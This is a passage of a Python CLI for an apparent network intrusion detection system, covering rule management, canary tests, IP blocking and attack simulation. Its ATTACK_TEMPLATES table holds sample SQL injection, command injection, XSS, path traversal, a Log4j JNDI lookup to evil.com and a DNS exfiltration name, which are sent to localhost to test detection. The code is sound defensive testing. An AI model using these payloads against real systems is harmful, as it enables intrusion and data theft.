def _forensic_export(args: argparse.Namespace) -> int:
    """Export the NDJSON forensic log to CSV or JSON."""
    if not args.output:
        print("ERROR: --output is required for 'forensic export'")
        return 2

    if not FORENSIC_LOG.exists():
        print(f"No log file found: {FORENSIC_LOG}")
        return 1

    output_path = Path(args.output)
    if not output_path.is_absolute():
        output_path = REPO_ROOT / args.output

    fmt = args.format or "json"
    if fmt not in ("json", "csv"):
        print(f"ERROR: --format must be 'json' or 'csv', got {fmt!r}")
        return 2

    records: list[dict] = []
    try:
        with open(FORENSIC_LOG, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    records.append(json.loads(line))
                except (json.JSONDecodeError, ValueError):
                    continue
    except OSError as e:
        print(f"ERROR reading log: {e}")
        return 1

    if not records:
        print("No records to export")
        return 0

    try:
        if fmt == "json":
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(records, f, indent=2, ensure_ascii=False)
        else:  # csv
            import csv
            # Collect all unique field names across all records
            fieldnames: list[str] = []
            for r in records:
                for k in r.keys():
                    if k not in fieldnames:
                        fieldnames.append(k)
            with open(output_path, "w", encoding="utf-8", newline="") as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
                writer.writeheader()
                for r in records:
                    writer.writerow(r)
    except OSError as e:
        print(f"ERROR writing output: {e}")
        return 1

    print(f"Exported {len(records)} records to {output_path}")
    print(f"Format: {fmt}")
    return 0


# =====================================================================
# Gate E - Policy & Testing commands (policy/simulate/canary)
# =====================================================================

CANARY_TESTS_FILE = REPO_ROOT / "config" / "canary_tests.json"
DISABLED_RULES_FILE = REPO_ROOT / "config" / "disabled_rules.json"
CANARY_RESULTS_FILE = REPO_ROOT / "logs" / "runtime" / "canary_results.json"


def _load_disabled_rules() -> set[str]:
    """Load the set of disabled rule IDs from config/disabled_rules.json."""
    if not DISABLED_RULES_FILE.exists():
        return set()
    try:
        data = json.loads(DISABLED_RULES_FILE.read_text(encoding="utf-8"))
        return set(data.get("disabled_rules", []))
    except (json.JSONDecodeError, OSError):
        return set()


def _save_disabled_rules(disabled: set[str]) -> None:
    """Save the set of disabled rule IDs to config/disabled_rules.json."""
    DISABLED_RULES_FILE.parent.mkdir(parents=True, exist_ok=True)
    data = {"disabled_rules": sorted(disabled), "version": "1.0.0"}
    DISABLED_RULES_FILE.write_text(
        json.dumps(data, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )


def cmd_policy(args: argparse.Namespace) -> int:
    """Policy management commands (list/show/reload/enable/disable)."""
    subcmd = args.subcommand
    if subcmd == "list":
        return _policy_list(args)
    elif subcmd == "show":
        return _policy_show(args)
    elif subcmd == "reload":
        return _policy_reload(args)
    elif subcmd == "enable":
        return _policy_enable(args)
    elif subcmd == "disable":
        return _policy_disable(args)
    else:
        print(f"ERROR: unknown policy subcommand: {subcmd!r}")
        return 2


def _policy_list(args: argparse.Namespace) -> int:
    """List all policies with their enabled/disabled state."""
    try:
        data = _load_rules()
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"ERROR: {e}")
        return 1
    rules = data.get("nids_rules", [])
    disabled = _load_disabled_rules()

    print(f"\n{'Rule ID':<10} {'Name':<40} {'Severity':<10} {'Action':<8} {'State':<10}")
    print("-" * 85)
    enabled_count = 0
    disabled_count = 0
    for r in rules:
        rid = r.get("rule_id", "?")
        state = "DISABLED" if rid in disabled else "ENABLED"
        if state == "ENABLED":
            enabled_count += 1
        else:
            disabled_count += 1
        print(f"{rid:<10} "
              f"{r.get('name', '?')[:40]:<40} "
              f"{r.get('severity', '?'):<10} "
              f"{r.get('action', '?'):<8} "
              f"{state:<10}")
    print(f"\nTotal: {len(rules)} rules ({enabled_count} enabled, {disabled_count} disabled)")
    return 0


def _policy_show(args: argparse.Namespace) -> int:
    """Show a single rule with its enabled/disabled state."""
    if not args.id:
        print("ERROR: --id is required for 'policy show'")
        return 2
    try:
        data = _load_rules()
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"ERROR: {e}")
        return 1
    rules = data.get("nids_rules", [])
    disabled = _load_disabled_rules()
    for r in rules:
        if r.get("rule_id", "").lower() == args.id.lower():
            r_copy = r.copy()
            r_copy["state"] = "DISABLED" if r["rule_id"] in disabled else "ENABLED"
            print(json.dumps(r_copy, indent=2, ensure_ascii=False))
            return 0
    print(f"Rule not found: {args.id}")
    return 1


def _policy_reload(args: argparse.Namespace) -> int:
    """Hot-reload rules from disk.

    On POSIX: sends SIGHUP to the core process (PID from logs/pids/core.pid).
    On Windows: this is a no-op for now (would need pipe-based command channel).
    """
    pid_file = PID_DIR / "core.pid"
    if not pid_file.exists():
        print("ERROR: core is not running (no PID file found)")
        print("       Start core first: python scripts/aegisctl.py start --component core")
        return 1
    try:
        pid = int(pid_file.read_text().strip())
    except (ValueError, OSError):
        print(f"ERROR: could not read PID from {pid_file}")
        return 1

    if not _is_process_alive(pid):
        print(f"ERROR: core process (pid={pid}) is not running")
        _clear_pid(next(c for c in COMPONENTS if c["name"] == "core"))
        return 1

    # Send SIGHUP on POSIX systems
    if sys.platform != "win32":
        try:
            os.kill(pid, signal.SIGHUP)
            print(f"Sent SIGHUP to core (pid={pid}) -- rules reloaded")
            return 0
        except (ProcessLookupError, PermissionError) as e:
            print(f"ERROR: could not signal core: {e}")
            return 1
    else:
        # On Windows, we can't use SIGHUP. The brain supports hot-reload
        # via file-watching (it checks Rules.json mtime every 10 iterations).
        print(f"On Windows, core uses file-watching for hot-reload.")
        print(f"Touch config/Rules.json to trigger reload:")
        print(f"  copy /b config\\Rules.json+,, config\\Rules.json")
        print(f"(core pid={pid} will detect the mtime change within ~10s)")
        return 0


def _policy_enable(args: argparse.Namespace) -> int:
    """Enable a rule (remove from disabled list)."""
    if not args.id:
        print("ERROR: --id is required for 'policy enable'")
        return 2
    disabled = _load_disabled_rules()
    if args.id.upper() not in disabled and args.id not in disabled:
        print(f"Rule {args.id} is already ENABLED (not in disabled list)")
        return 0
    disabled.discard(args.id.upper())
    disabled.discard(args.id)
    _save_disabled_rules(disabled)
    print(f"Rule {args.id} ENABLED")
    print("(Note: changes take effect after 'policy reload' or core restart)")
    return 0


def _policy_disable(args: argparse.Namespace) -> int:
    """Disable a rule (add to disabled list)."""
    if not args.id:
        print("ERROR: --id is required for 'policy disable'")
        return 2
    # Verify the rule exists
    try:
        data = _load_rules()
        rules = data.get("nids_rules", [])
        rule_ids = {r.get("rule_id", "") for r in rules}
        if args.id.upper() not in rule_ids and args.id not in rule_ids:
            print(f"ERROR: rule {args.id} not found in Rules.json")
            return 1
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"WARNING: could not verify rule exists: {e}")
    disabled = _load_disabled_rules()
    disabled.add(args.id.upper())
    _save_disabled_rules(disabled)
    print(f"Rule {args.id} DISABLED")
    print("(Note: changes take effect after 'policy reload' or core restart)")
    return 0


def cmd_simulate(args: argparse.Namespace) -> int:
    """Attack simulation commands (attack/packet/flood/replay)."""
    subcmd = args.subcommand
    if subcmd == "attack":
        return _simulate_attack(args)
    elif subcmd == "packet":
        return _simulate_packet(args)
    elif subcmd == "flood":
        return _simulate_flood(args)
    elif subcmd == "replay":
        return _simulate_replay(args)
    else:
        print(f"ERROR: unknown simulate subcommand: {subcmd!r}")
        return 2


# Predefined attack templates for 'simulate attack'
ATTACK_TEMPLATES = {
    "SQL_INJECTION": {
        "attack_type": "SQLI_BYPASS", "payload": "' OR 1=1 --",
        "rule_id": "R0056", "severity": "Critical", "policy": "Drop",
        "dst_port": 80,
    },
    "CMD_INJECTION": {
        "attack_type": "OSI_SEMI", "payload": ";whoami",
        "rule_id": "R9064", "severity": "Critical", "policy": "Drop",
        "dst_port": 8080,
    },
    "XSS": {
        "attack_type": "XSS_BASIC", "payload": "<script>alert(1)</script>",
        "rule_id": "R9059", "severity": "High", "policy": "Alert",
        "dst_port": 443,
    },
    "PATH_TRAVERSAL": {
        "attack_type": "PATH_TRAVERSAL", "payload": "../../../etc/passwd",
        "rule_id": "R0088", "severity": "Critical", "policy": "Block",
        "dst_port": 80,
    },
    "PORT_SCAN": {
        "attack_type": "PORT_SCAN_SYN", "payload": "SYN scan",
        "rule_id": "R9006", "severity": "Medium", "policy": "Alert",
        "dst_port": 22,
    },
    "LOG4J": {
        "attack_type": "LOG4J_JNDI", "payload": "${jndi:ldap://evil.com/x}",
        "rule_id": "R0056", "severity": "Critical", "policy": "Drop",
        "dst_port": 8080,
    },
    "BRUTE_FORCE": {
        "attack_type": "BRUTE_FORCE_SSH", "payload": "root:password123",
        "rule_id": "R9006", "severity": "Medium", "policy": "Alert",
        "dst_port": 22,
    },
    "DATA_EXFIL": {
        "attack_type": "DATA_EXFIL_DNS", "payload": "large-dns-query.evil.com",
        "rule_id": "R9059", "severity": "Low", "policy": "Alert",
        "dst_port": 53,
    },
}


def _simulate_attack(args: argparse.Namespace) -> int:
    """Send a predefined attack pattern via UDP to brain."""
    attack_type = args.type.upper() if args.type else ""
    if attack_type not in ATTACK_TEMPLATES:
        print(f"ERROR: unknown attack type: {args.type!r}")
        print(f"Available types: {', '.join(sorted(ATTACK_TEMPLATES.keys()))}")
        return 2

    template = ATTACK_TEMPLATES[attack_type]
    event = {
        "attack_type": template["attack_type"],
        "src_ip": args.src_ip or "10.0.0.99",
        "dst_ip": "127.0.0.1",
        "src_port": 12345,
        "dst_port": template["dst_port"],
        "protocol": "TCP" if template["dst_port"] != 53 else "UDP",
        "severity": template["severity"],
        "policy": template["policy"],
        "rule_id": template["rule_id"],
        "payload": template["payload"],
        "reason": f"Gate-E simulate attack ({attack_type})",
        "source": "aegisctl simulate",
        "timestamp": int(time.time()),
    }

    print(f"Simulating {attack_type} attack...")
    print(f"  Event: {json.dumps(event, separators=(',', ':'))}")

    # Send via UDP to brain
    payload = json.dumps(event).encode("utf-8")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(2.0)
            s.sendto(payload, ("127.0.0.1", 9999))
        print(f"  Sent via UDP to 127.0.0.1:9999 (brain)")
        print(f"\nCheck detection: python scripts/aegisctl.py events tail --count 5")
        return 0
    except Exception as e:
        print(f"  ERROR: {e}")
        print(f"  (Is brain running? python scripts/aegisctl.py start --component brain)")
        return 1


def _simulate_packet(args: argparse.Namespace) -> int:
    """Send a custom packet event via UDP to brain."""
    event = {
        "attack_type": "CUSTOM_PACKET",
        "src_ip": args.src_ip or "10.0.0.99",
        "dst_ip": "127.0.0.1",
        "src_port": 12345,
        "dst_port": args.dst_port or 80,
        "protocol": "TCP",
        "severity": "Medium",
        "policy": "Alert",
        "rule_id": "CUSTOM",
        "payload": args.payload or "",
        "reason": "Gate-E simulate packet",
        "source": "aegisctl simulate",
        "timestamp": int(time.time()),
    }

    print(f"Sending custom packet...")
    print(f"  Event: {json.dumps(event, separators=(',', ':'))}")

    payload = json.dumps(event).encode("utf-8")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(2.0)
            s.sendto(payload, ("127.0.0.1", 9999))
        print(f"  Sent via UDP to 127.0.0.1:9999")
        return 0
    except Exception as e:
        print(f"  ERROR: {e}")
        return 1


def _simulate_flood(args: argparse.Namespace) -> int:
    """Send a flood of events at a specified rate."""
    count = args.count or 50
    rate = args.rate or 50  # events per second
    delay = 1.0 / rate if rate > 0 else 0

    print(f"Flooding {count} events at {rate} events/sec (delay={delay:.4f}s)")
    print(f"  src_ip: 10.0.0.99, dst_port: 80, severity: High")
    print()

    success = 0
    failed = 0
    start_time = time.time()

    for i in range(count):
        event = {
            "attack_type": "FLOOD_TEST",
            "src_ip": f"10.0.0.{(i % 254) + 1}",
            "dst_ip": "127.0.0.1",
            "src_port": 12345 + i,
            "dst_port": 80,
            "protocol": "TCP",
            "severity": "High",
            "policy": "Alert",
            "rule_id": "FLOOD",
            "payload": f"flood-event-{i}",
            "reason": "Gate-E simulate flood",
            "source": "aegisctl simulate",
            "timestamp": int(time.time()),
        }
        payload = json.dumps(event).encode("utf-8")
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(1.0)
                s.sendto(payload, ("127.0.0.1", 9999))
            success += 1
        except Exception:
            failed += 1
        if i < count - 1 and delay > 0:
            time.sleep(delay)

    elapsed = time.time() - start_time
    actual_rate = success / elapsed if elapsed > 0 else 0
    print(f"\nFlood complete: {success}/{count} sent, {failed} failed")
    print(f"  Elapsed: {elapsed:.2f}s (actual rate: {actual_rate:.1f} events/sec)")
    return 0 if failed == 0 else 1


def _simulate_replay(args: argparse.Namespace) -> int:
    """Replay events from an NDJSON log file."""
    if not args.file:
        print("ERROR: --file is required for 'simulate replay'")
        return 2
    replay_path = Path(args.file)
    if not replay_path.is_absolute():
        replay_path = REPO_ROOT / args.file
    if not replay_path.exists():
        print(f"ERROR: file not found: {replay_path}")
        return 1

    count = 0
    failed = 0
    with open(replay_path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                event = json.loads(line)
                payload = json.dumps(event).encode("utf-8")
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.settimeout(1.0)
                    s.sendto(payload, ("127.0.0.1", 9999))
                count += 1
            except (json.JSONDecodeError, OSError):
                failed += 1
            if args.delay and count > 0:
                time.sleep(args.delay)

    print(f"Replay complete: {count} events sent, {failed} failed")
    print(f"  Source: {replay_path}")
    return 0 if failed == 0 else 1


def cmd_canary(args: argparse.Namespace) -> int:
    """Canary test commands (run/status/report)."""
    subcmd = args.subcommand
    if subcmd == "run":
        return _canary_run(args)
    elif subcmd == "status":
        return _canary_status(args)
    elif subcmd == "report":
        return _canary_report(args)
    else:
        print(f"ERROR: unknown canary subcommand: {subcmd!r}")
        return 2


def _load_canary_tests() -> list[dict]:
    """Load canary test definitions from config/canary_tests.json."""
    if not CANARY_TESTS_FILE.exists():
        return []
    try:
        data = json.loads(CANARY_TESTS_FILE.read_text(encoding="utf-8"))
        return data.get("tests", [])
    except (json.JSONDecodeError, OSError):
        return []


def _canary_run(args: argparse.Namespace) -> int:
    """Run canary tests (all or a specific one by name)."""
    tests = _load_canary_tests()
    if not tests:
        print(f"ERROR: no canary tests found in {CANARY_TESTS_FILE}")
        return 1

    # Filter by test name if specified
    if args.test:
        tests = [t for t in tests if t["name"] == args.test]
        if not tests:
            print(f"ERROR: canary test {args.test!r} not found")
            print(f"Available: {', '.join(t['name'] for t in _load_canary_tests())}")
            return 2

    print("=" * 70)
    print("AEGIS NIDS Canary Test Runner (Gate E)")
    print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Tests to run: {len(tests)}")
    print("=" * 70)

    results = []
    passed = 0
    failed = 0
    skipped = 0

    for test in tests:
        name = test["name"]
        desc = test.get("description", "")
        expected_rule = test.get("expected_rule_id", "?")
        expected_severity = test.get("expected_severity", "?")
        event = test.get("event", {})

        print(f"\n--- [{name}] {desc} ---")
        print(f"  Expected: rule={expected_rule}, severity={expected_severity}")
        print(f"  Event: {json.dumps(event, separators=(',', ':'))}")

        # Send the event via UDP to brain
        payload = json.dumps(event).encode("utf-8")
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(2.0)
                s.sendto(payload, ("127.0.0.1", 9999))
            print(f"  Sent via UDP to 127.0.0.1:9999")
            # Mark as "sent" -- actual detection verification would require
            # checking the forensic log for the expected rule_id.
            result = {
                "name": name,
                "description": desc,
                "expected_rule_id": expected_rule,
                "expected_severity": expected_severity,
                "status": "SENT",
                "timestamp": int(time.time()),
                "event_sent": event,
            }
            passed += 1
        except Exception as e:
            print(f"  ERROR: {e}")
            result = {
                "name": name,
                "description": desc,
                "expected_rule_id": expected_rule,
                "expected_severity": expected_severity,
                "status": "FAILED",
                "error": str(e),
                "timestamp": int(time.time()),
                "event_sent": event,
            }
            failed += 1
        results.append(result)
        time.sleep(0.1)  # small delay between tests

    # Save results
    CANARY_RESULTS_FILE.parent.mkdir(parents=True, exist_ok=True)
    report = {
        "timestamp": int(time.time()),
        "total": len(results),
        "sent": passed,
        "failed": failed,
        "results": results,
    }
    CANARY_RESULTS_FILE.write_text(
        json.dumps(report, indent=2, ensure_ascii=False),
        encoding="utf-8",
    )

    print(f"\n{'=' * 70}")
    print(f"Canary test complete: {passed} sent, {failed} failed, {skipped} skipped")
    print(f"Results saved to: {CANARY_RESULTS_FILE.relative_to(REPO_ROOT)}")
    print(f"{'=' * 70}")
    print(f"\nTo verify detection, run:")
    print(f"  python scripts/aegisctl.py events tail --count {len(results) + 5}")
    print(f"  python scripts/aegisctl.py canary report")
    return 0 if failed == 0 else 1


def _canary_status(args: argparse.Namespace) -> int:
    """Show the status of the last canary test run."""
    if not CANARY_RESULTS_FILE.exists():
        print("No canary results found (run 'aegisctl canary run' first)")
        return 0

    try:
        report = json.loads(CANARY_RESULTS_FILE.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError) as e:
        print(f"ERROR: could not read results: {e}")
        return 1

    print(f"\n=== Canary Test Status ===")
    print(f"Last run: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(report.get('timestamp', 0)))}")
    print(f"Total: {report.get('total', 0)}")
    print(f"Sent:  {report.get('sent', 0)}")
    print(f"Failed: {report.get('failed', 0)}")
    print(f"\nResults:")
    print(f"  {'Name':<25} {'Status':<8} {'Expected Rule':<12} {'Expected Severity'}")
    print(f"  {'-' * 70}")
    for r in report.get("results", []):
        print(f"  {r['name']:<25} {r['status']:<8} "
              f"{r.get('expected_rule_id', '?'):<12} "
              f"{r.get('expected_severity', '?')}")
    return 0


def _canary_report(args: argparse.Namespace) -> int:
    """Generate a detailed canary test report."""
    if not CANARY_RESULTS_FILE.exists():
        print("No canary results found (run 'aegisctl canary run' first)")
        return 0

    try:
        report = json.loads(CANARY_RESULTS_FILE.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError) as e:
        print(f"ERROR: could not read results: {e}")
        return 1

    print("=" * 70)
    print("AEGIS NIDS Canary Test Report (Gate E)")
    print("=" * 70)
    print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(report.get('timestamp', 0)))}")
    print(f"Total tests: {report.get('total', 0)}")
    print(f"Sent:        {report.get('sent', 0)}")
    print(f"Failed:      {report.get('failed', 0)}")

    results = report.get("results", [])
    if not results:
        print("\nNo test results to report.")
        return 0

    print(f"\n{'Test Name':<25} {'Category':<20} {'Severity':<10} {'Rule':<10} {'Status'}")
    print("-" * 80)
    for r in results:
        # Load the test definition to get category
        tests = _load_canary_tests()
        test_def = next((t for t in tests if t["name"] == r["name"]), {})
        category = test_def.get("category", "?")
        print(f"{r['name']:<25} "
              f"{category:<20} "
              f"{r.get('expected_severity', '?'):<10} "
              f"{r.get('expected_rule_id', '?'):<10} "
              f"{r['status']}")

    print(f"\n{'=' * 70}")
    print("Report complete.")
    print(f"{'=' * 70}")
    print(f"\nFull JSON report: {CANARY_RESULTS_FILE.relative_to(REPO_ROOT)}")
    return 0


# =====================================================================
# Gate F - Enforcement commands (block/enforce/quarantine)
# =====================================================================

BLOCK_LIST_FILE = REPO_ROOT / "logs" / "blocked_ips.json"
QUARANTINE_FILE = REPO_ROOT / "logs" / "quarantine.json"
PEP_STATE_FILE = REPO_ROOT / "logs" / "runtime" / "pep_state.json"


def _load_block_list() -> dict:
    """Load the blocked IPs list from logs/blocked_ips.json."""
    if not BLOCK_LIST_FILE.exists():
        return {"blocked_ips": [], "version": "1.0.0"}
    try:
        return json.loads(BLOCK_LIST_FILE.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return {"blocked_ips": [], "version": "1.0.0"}


def _save_block_list(data: dict) -> None:
    """Save the blocked IPs list."""
    BLOCK_LIST_FILE.parent.mkdir(parents=True, exist_ok=True)
    BLOCK_LIST_FILE.write_text(
        json.dumps(data, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )


def _load_quarantine() -> dict:
    """Load the quarantine list."""
    if not QUARANTINE_FILE.exists():
        return {"quarantined_ips": [], "version": "1.0.0"}
    try:
        return json.loads(QUARANTINE_FILE.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return {"quarantined_ips": [], "version": "1.0.0"}


def _save_quarantine(data: dict) -> None:
    QUARANTINE_FILE.parent.mkdir(parents=True, exist_ok=True)
    QUARANTINE_FILE.write_text(
        json.dumps(data, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )


def _load_pep_state() -> dict:
    """Load PEP (Policy Enforcement Point) state."""
    if not PEP_STATE_FILE.exists():
        return {"enabled": True, "mode": "fail-open", "version": "1.0.0",
                "last_updated": int(time.time())}
    try:
        return json.loads(PEP_STATE_FILE.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return {"enabled": True, "mode": "fail-open", "version": "1.0.0",
                "last_updated": int(time.time())}


def _save_pep_state(data: dict) -> None:
    PEP_STATE_FILE.parent.mkdir(parents=True, exist_ok=True)
    data["last_updated"] = int(time.time())
    PEP_STATE_FILE.write_text(
        json.dumps(data, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )


def cmd_block(args: argparse.Namespace) -> int:
    """IP block management (add/remove/list/clear)."""
    subcmd = args.subcommand
    if subcmd == "add":
        return _block_add(args)
    elif subcmd == "remove":
        return _block_remove(args)
    elif subcmd == "list":
        return _block_list(args)
    elif subcmd == "clear":
        return _block_clear(args)
    else:
        print(f"ERROR: unknown block subcommand: {subcmd!r}")
        return 2


def _block_add(args: argparse.Namespace) -> int:
    """Block an IP address (add to blocked_ips.json + signal core if running)."""
    if not args.ip:
        print("ERROR: --ip is required for 'block add'")
        return 2

    data = _load_block_list()
    blocked = data.get("blocked_ips", [])

    # Check if already blocked
    for entry in blocked:
        if entry.get("ip") == args.ip:
            print(f"IP {args.ip} is already BLOCKED (since {entry.get('blocked_at', '?')})")
            return 0

    # Add new block entry
    entry = {
        "ip": args.ip,
        "blocked_at": int(time.time()),
        "duration": args.duration or 0,  # 0 = permanent
        "reason": args.reason or "Manual block via aegisctl",
        "blocked_by": "aegisctl",
    }
    blocked.append(entry)
    data["blocked_ips"] = blocked
    _save_block_list(data)

    # Try to signal core to apply the block via WFP IOCTL
    # (This is a best-effort notification; if core is not running, the
    # block list will be picked up on next start.)
    signalled = _signal_core_block(args.ip)
    if signalled:
        print(f"IP {args.ip} BLOCKED and signal sent to core")
    else:
        print(f"IP {args.ip} BLOCKED (added to list; core not running or signal failed)")
    if args.duration:
        print(f"  Duration: {args.duration}s (auto-unblock after expiry)")
    else:
        print(f"  Duration: permanent (use 'block remove --ip {args.ip}' to unblock)")
    print(f"  Reason: {entry['reason']}")
    return 0


def _block_remove(args: argparse.Namespace) -> int:
    """Remove an IP from the block list."""
    if not args.ip:
        print("ERROR: --ip is required for 'block remove'")
        return 2

    data = _load_block_list()
    blocked = data.get("blocked_ips", [])
    original_count = len(blocked)
    data["blocked_ips"] = [e for e in blocked if e.get("ip") != args.ip]

    if len(data["blocked_ips"]) == original_count:
        print(f"IP {args.ip} is NOT in the block list (nothing to remove)")
        return 0

    _save_block_list(data)

    # Try to signal core to unblock
    signalled = _signal_core_unblock(args.ip)
    if signalled:
        print(f"IP {args.ip} UNBLOCKED and signal sent to core")
    else:
        print(f"IP {args.ip} UNBLOCKED (removed from list; core not running)")
    return 0


def _block_list(args: argparse.Namespace) -> int:
    """List all blocked IPs."""
    data = _load_block_list()
    blocked = data.get("blocked_ips", [])

    if not blocked:
        print("No IPs are currently blocked.")
        return 0

    print(f"\n{'IP Address':<18} {'Blocked At':<22} {'Duration':<12} {'Reason'}")
    print("-" * 80)
    for entry in blocked:
        ip = entry.get("ip", "?")
        blocked_at = entry.get("blocked_at", 0)
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(blocked_at)) if blocked_at else "?"
        duration = entry.get("duration", 0)
        if duration == 0:
            dur_str = "permanent"
        else:
            remaining = duration - (int(time.time()) - blocked_at)
            if remaining <= 0:
                dur_str = "expired"
            else:
                dur_str = f"{remaining}s remaining"
        reason = entry.get("reason", "?")[:40]
        print(f"{ip:<18} {ts:<22} {dur_str:<12} {reason}")
    print(f"\nTotal: {len(blocked)} IP(s) blocked")
    return 0


def _block_clear(args: argparse.Namespace) -> int:
    """Clear all blocked IPs."""
    data = _load_block_list()
    count = len(data.get("blocked_ips", []))
    if count == 0:
        print("Block list is already empty.")
        return 0

    data["blocked_ips"] = []
    _save_block_list(data)
    print(f"Cleared {count} IP(s) from block list")

    # Try to signal core to clear blocks
    # (best-effort; not critical if core is not running)
    print("(Note: if core is running, blocks may persist in WFP until core restart)")
    return 0


def _signal_core_block(ip: str) -> bool:
    """Best-effort: signal core to apply an IP block via WFP IOCTL.

    On POSIX: sends SIGUSR1 to core (which reads blocked_ips.json).
    On Windows: no signal mechanism (core uses file-watching).
    Returns True if signal was sent, False otherwise.
    """
    pid_file = PID_DIR / "core.pid"
    if not pid_file.exists():
        return False
    try:
        pid = int(pid_file.read_text().strip())
    except (ValueError, OSError):
        return False
    if not _is_process_alive(pid):
        return False
    if sys.platform != "win32":
        try:
            os.kill(pid, signal.SIGUSR1)
            return True
        except (ProcessLookupError, PermissionError):
            return False
    else:
        # On Windows, core uses file-watching for blocked_ips.json
        # (mtime change is detected within ~10s)
        return True  # file was already updated, core will pick it up


def _signal_core_unblock(ip: str) -> bool:
    """Best-effort: signal core to remove an IP block."""
    # Same mechanism as block (core reads the file)
    return _signal_core_block(ip)  # file was already updated


def cmd_enforce(args: argparse.Namespace) -> int:
    """PEP (Policy Enforcement Point) management (status/enable/disable/push)."""
    subcmd = args.subcommand
    if subcmd == "status":
        return _enforce_status(args)
    elif subcmd == "enable":
        return _enforce_enable(args)
    elif subcmd == "disable":
        return _enforce_disable(args)
    elif subcmd == "push":
        return _enforce_push(args)
    else:
        print(f"ERROR: unknown enforce subcommand: {subcmd!r}")
        return 2


def _enforce_status(args: argparse.Namespace) -> int:
    """Show PEP enforcement status."""
    state = _load_pep_state()
    block_data = _load_block_list()
    blocked_count = len(block_data.get("blocked_ips", []))

    print(f"\n=== PEP (Policy Enforcement Point) Status ===")
    print(f"  Enabled:       {state.get('enabled', True)}")
    print(f"  Mode:          {state.get('mode', 'fail-open')}")
    print(f"  Version:       {state.get('version', '1.0.0')}")
    last_updated = state.get("last_updated", 0)
    if last_updated:
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(last_updated))
        print(f"  Last updated:  {ts}")
    print(f"  Blocked IPs:   {blocked_count}")
    print(f"\n  State file:    {PEP_STATE_FILE.relative_to(REPO_ROOT)}")
    print(f"  Block list:    {BLOCK_LIST_FILE.relative_to(REPO_ROOT)}")

    # Show shield DLL status (via core --version output if available)
    print(f"\n  Shield DLL (sec_monitor.dll):")
    shield_path = REPO_ROOT / "shield" / "target" / "release" / "sec_monitor.dll"
    if shield_path.exists():
        print(f"    Present: {shield_path.relative_to(REPO_ROOT)} ({shield_path.stat().st_size} bytes)")
    else:
        shield_path2 = REPO_ROOT / "target" / "release" / "sec_monitor.dll"
        if shield_path2.exists():
            print(f"    Present: {shield_path2.relative_to(REPO_ROOT)} ({shield_path2.stat().st_size} bytes)")
        else:
            print(f"    MISSING (build with: cargo build --release --manifest-path shield\\Cargo.toml)")
    return 0


def _enforce_enable(args: argparse.Namespace) -> int:
    """Enable PEP enforcement."""
    state = _load_pep_state()
    if state.get("enabled"):
        print("PEP enforcement is already ENABLED")
        return 0
    state["enabled"] = True
    _save_pep_state(state)
    print("PEP enforcement ENABLED")
    print("  - All Drop/Block rules will be enforced")
    print("  - Blocked IPs list is active")
    print("  - Shield DLL (sec_monitor.dll) validates payloads")
    return 0


def _enforce_disable(args: argparse.Namespace) -> int:
    """Disable PEP enforcement (fail-open mode)."""
    state = _load_pep_state()
    if not state.get("enabled"):
        print("PEP enforcement is already DISABLED")
        return 0
    state["enabled"] = False
    _save_pep_state(state)
    print("PEP enforcement DISABLED")
    print("  WARNING: All rules will be in Alert-only mode (no blocks)")
    print("  - Existing blocks remain in WFP until expiry or manual removal")
    print("  - Shield DLL still validates but does not enforce")
    print("  - Use 'aegisctl enforce enable' to re-enable")
    return 0


def _enforce_push(args: argparse.Namespace) -> int:
    """Push a policy file to the PEP (Rust shield).

    This copies the specified policy file to config/Rules.json and
    signals core to reload.
    """
    if not args.policy:
        print("ERROR: --policy is required for 'enforce push'")
        return 2

    policy_path = Path(args.policy)
    if not policy_path.is_absolute():
        policy_path = REPO_ROOT / args.policy
    if not policy_path.exists():
        print(f"ERROR: policy file not found: {policy_path}")
        return 1

    # Validate the policy file is valid JSON
    try:
        data = json.loads(policy_path.read_text(encoding="utf-8"))
        if "nids_rules" not in data:
            print(f"ERROR: policy file does not contain 'nids_rules' key")
            return 1
        rule_count = len(data.get("nids_rules", []))
    except json.JSONDecodeError as e:
        print(f"ERROR: invalid JSON in policy file: {e}")
        return 1

    # Copy to config/Rules.json
    dest = REPO_ROOT / "config" / "Rules.json"
    dest.parent.mkdir(parents=True, exist_ok=True)
    import shutil
    shutil.copy2(str(policy_path), str(dest))

    print(f"Policy pushed: {policy_path.name} -> {dest.relative_to(REPO_ROOT)}")
    print(f"  Rules: {rule_count}")

    # Signal core to reload
    print(f"\nTo activate, run:")
    print(f"  python scripts/aegisctl.py policy reload")
    return 0


def cmd_quarantine(args: argparse.Namespace) -> int:
    """Quarantine management (add/remove/list)."""
    subcmd = args.subcommand
    if subcmd == "add":
        return _quarantine_add(args)
    elif subcmd == "remove":
        return _quarantine_remove(args)
    elif subcmd == "list":
        return _quarantine_list(args)
    else:
